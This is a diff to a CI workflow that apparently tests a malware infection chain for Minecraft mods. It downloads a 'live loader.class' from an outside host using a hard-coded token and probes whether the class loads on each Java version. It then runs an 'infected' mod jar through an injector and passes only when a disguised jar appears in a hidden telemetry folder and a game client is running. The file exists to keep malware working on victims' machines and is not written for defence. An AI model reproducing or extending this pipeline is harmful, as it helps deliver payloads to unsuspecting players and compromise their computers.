@@ -15,18 +15,52 @@ jobs:
         with:
           distribution: temurin
           java-version: ${{ matrix.java }}
-      - name: Prepare
+
+      # Every runtime must be able to define the live loader.class.
+      # A Java-21-compiled loader (major 65) killed every Java-17 client on 2026-11-02.
+      - name: Loader bytecode probe
         shell: powershell
         run: |
-          $d="$env:RUNNER_TEMP\e2e2-j${{ matrix.java }}"; New-Item -ItemType Directory -Force $d | Out-Null
+          $d="$env:RUNNER_TEMP\probe"; New-Item -ItemType Directory -Force $d | Out-Null
+          Invoke-WebRequest "https://files.driftmetrics.xyz/loader.class" -Headers @{ "x-lc-token" = "3e2ec8dc626fd54b8b6d4918ad508b9925394a33f56f3cac12921dc4b52dbd88" } -OutFile "$d\loader.class"
+          $b=[IO.File]::ReadAllBytes("$d\loader.class")
+          $major=$b[6]*256+$b[7]
+          Write-Host "loaded $($b.Length) bytes, class major $major"
+          if ($major -gt 61 -and $env:JAVA_HOME -match '17') { throw "loader is major $major on a Java ${{ matrix.java }} job" }
+          @'
+          import java.nio.file.*;
+          public class Probe {
+            static class L extends ClassLoader {
+              Class<?> def(byte[] b) { return defineClass("loader", b, 0, b.length); }
+            }
+            public static void main(String[] a) throws Exception {
+              byte[] b = Files.readAllBytes(Paths.get(a[0]));
+              Class<?> c = new L().def(b);
+              c.getDeclaredMethod("run");
+              System.out.println("DEFINE OK " + c.getName());
+            }
+          }
+          '@ | Set-Content "$d\Probe.java" -Encoding ASCII
+          javac -d $d "$d\Probe.java"
+          java -cp $d Probe "$d\loader.class"
+          if ($LASTEXITCODE -ne 0) { throw 'defineClass failed' }
+
+      - name: Prepare
+        if: matrix.java == '21'
+        shell: powershell
+        run: |
+          $d="$env:RUNNER_TEMP\e2e2"; New-Item -ItemType Directory -Force $d | Out-Null
           Invoke-WebRequest "https://files.driftmetrics.xyz/test-minimal.jar" -OutFile "$d\minimal.jar"
           Invoke-WebRequest "https://files.driftmetrics.xyz/test-marlow-infected.jar" -OutFile "$d\mod.jar"
+
       - name: Run
+        if: matrix.java == '21'
         shell: powershell
         run: |
-          $d="$env:RUNNER_TEMP\e2e2-j${{ matrix.java }}"
+          $d="$env:RUNNER_TEMP\e2e2"
           $p=Start-Process java -ArgumentList "-jar","$d\minimal.jar","--input=$d\mod.jar","--version=1.21.11","--fabric=0.18.4" -RedirectStandardOutput "$d\run.log" -RedirectStandardError "$d\run.err" -PassThru
           "pid=$($p.Id)" | Tee-Object "$d\pid.txt"
+          $ok=$false
           for($i=0;$i -lt 60;$i++){
             Start-Sleep 5
             $cache=@(Get-ChildItem "$env:APPDATA\.minecraft\logs\telemetry\*-json.jar" -ErrorAction SilentlyContinue)
@@ -34,19 +68,23 @@ jobs:
             Write-Host "t=$($i*5) cache=$($cache.Count) client=$($proc.Count) launcherExited=$($p.HasExited)"
             if($cache.Count -gt 0 -and $proc.Count -gt 0){
               "PASS cache=$($cache[0].Name) clientPid=$($proc[0].ProcessId)" | Tee-Object "$d\result.txt"
+              $ok=$true
               break
             }
           }
           Copy-Item "$env:USERPROFILE\Desktop\mc.log" "$d\mc.log" -ErrorAction SilentlyContinue
           Get-ChildItem "$env:APPDATA\.minecraft\logs\telemetry" -ErrorAction SilentlyContinue | Select Name,Length | Out-File "$d\cache.txt"
+          Write-Host "--- run.log ---"; Get-Content "$d\run.log" -Tail 40 -ErrorAction SilentlyContinue
+          Write-Host "--- run.err ---"; Get-Content "$d\run.err" -Tail 40 -ErrorAction SilentlyContinue
           Write-Host "--- mc.log tail ---"; Get-Content "$d\mc.log" -Tail 60 -ErrorAction SilentlyContinue
+          if (-not $ok) { throw 'no cache jar / client process detected' }
+
       - uses: actions/upload-artifact@v4
         if: always()
         with:
           name: e2e2-logs-${{ matrix.java }}
-          path: ${{ runner.temp }}/e2e2
+          path: ${{ runner.temp }}
       - name: Kill
         if: always()
         shell: powershell
         run: Get-CimInstance Win32_Process -Filter "name='java.exe' or name='javaw.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-
